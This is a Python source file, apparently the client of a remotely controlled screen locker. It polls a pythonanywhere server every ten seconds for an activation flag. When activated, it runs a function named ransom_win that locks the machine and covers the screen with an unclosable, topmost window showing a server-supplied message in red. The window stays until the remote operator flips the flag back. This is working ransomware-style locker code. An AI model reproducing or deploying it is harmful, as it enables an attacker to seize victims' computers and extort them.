import requests
from Client.finals import Finals as final
from apscheduler.schedulers.blocking import BlockingScheduler
from threading import Thread
from Client.assisting import *
from Client.devcon_automations import *
from time import sleep
import tkinter as tk


getActivation = "http://defensiveblocks.pythonanywhere.com/clients/" + final.USERNAME + "/"
getMsg = "http://defensiveblocks.pythonanywhere.com/clientsm/" + final.USERNAME + "/"
scheduler = BlockingScheduler()
wa = ""


def ransom_win():
    print("hello")
    msg = requests.get(getMsg).text
    wa = tk.Tk()
    wa.title('Defensive Blocks')
    wa.overrideredirect(True)
    wa.geometry("{0}x{1}+0+0".format(wa.winfo_screenwidth()+200, wa.winfo_screenheight()+200))
    wa.focus_set()  # <-- move focus to this widget
    wa.protocol("WM_DELETE_WINDOW", exb)
    wa.protocol("WM_MINIMIZE_WINDOW", exb)
    lb1 = tk.Label(wa, text=str(msg) + "\n", font=("Arial Bold", 70), pady=200, fg="RED")
    lb1.pack()
    wa.call('wm', 'attributes', '.', '-topmost', '1')
    while 1:
        wa.update()
        lock()
        sleep(2)
        a_field = get(final.active_field)
        if a_field == "0":
            wa.destroy()
            return


def main():
    activation = (requests.get(getActivation)).text  # current activation
    print(activation)
    msg = (requests.get(getMsg)).text  # current msg
    try:
        is_open = wa.winfo_ismapped()  # if the window is open return 1"""
    except:
        is_open = 0  # if window closed return exception """
    if get(final.active_field) != activation:  # compare previous to current
        print("in long if")
        if (str(activation) == "1") and (str(get(final.active_field)) == "0"):
            print("here")
            replace(final.active_field, activation)
            lock()
            open_window = Thread(target=ransom_win)
            open_window.start()
        elif (str(activation) == "0") and (str(get(final.active_field)) == "1"):
            replace(final.active_field, activation)
            unlock()
    elif activation == "1":
        print("in activation == 1")
        print("is open is " + str(is_open))
        if is_open != get(final.active_field) and is_open == 0:
            replace(final.active_field, 1)
            lock()
            open_window = Thread(target=ransom_win)
            open_window.start()
    elif activation == "0":
        print("in activation == 0")
        print("is open is " + str(is_open))

        if is_open != get(final.active_field) and is_open == 1:
            replace(final.active_field, 0)
            unlock()
    else:
        print("in else")
        return


scheduler.add_job(main, 'cron', second="0,10,20,30,40,50")  # replace if want to 0,30
scheduler.start()
